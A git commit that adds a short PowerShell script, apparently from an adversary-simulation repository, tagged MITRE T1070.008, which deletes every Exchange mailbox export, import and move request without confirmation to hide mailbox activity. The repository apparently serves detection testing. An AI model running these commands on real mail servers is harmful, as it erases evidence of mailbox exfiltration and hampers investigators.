f484321ca8e13af1aa22da73aacdb669cf686053
mthcht <75267080+mthcht@users.noreply.github.com>
2022-12-09 23:33:12 +0100

    Create delete_mailbox_activity.ps1

---
+++ Simulation/Windows/Exchange/delete_mailbox_activity.ps1
@@ -0,0 +1,31 @@
+#Hide actions on mailbox (T1070.008)
+
+#Import the Exchange PowerShell Module
+Import-Module Exchange
+
+#Get the list of all Export Requests
+$ExportRequests = Get-MailboxExportRequest
+
+#Get the list of all Import Requests
+$ImportRequests = Get-MailboxImportRequest
+
+#Get the list of all Move Requests
+$MoveRequests = Get-MoveRequest
+
+#Loop through the list of export requests and hide the requests
+foreach($ExportRequest in $ExportRequests)
+{
+ Remove-MailboxExportRequest -Identity $ExportRequest -Confirm:$false
+}
+
+#Loop through the list of import requests and hide the requests
+foreach($ImportRequest in $ImportRequests)
+{
+ Remove-MailboxImportRequest -Identity $ImportRequest -Confirm:$false
+}
+
+#Loop through the list of move requests and hide the requests
+foreach($MoveRequest in $MoveRequests)
+{
+ Remove-MoveRequest -Identity $MoveRequest -Confirm:$false
+}
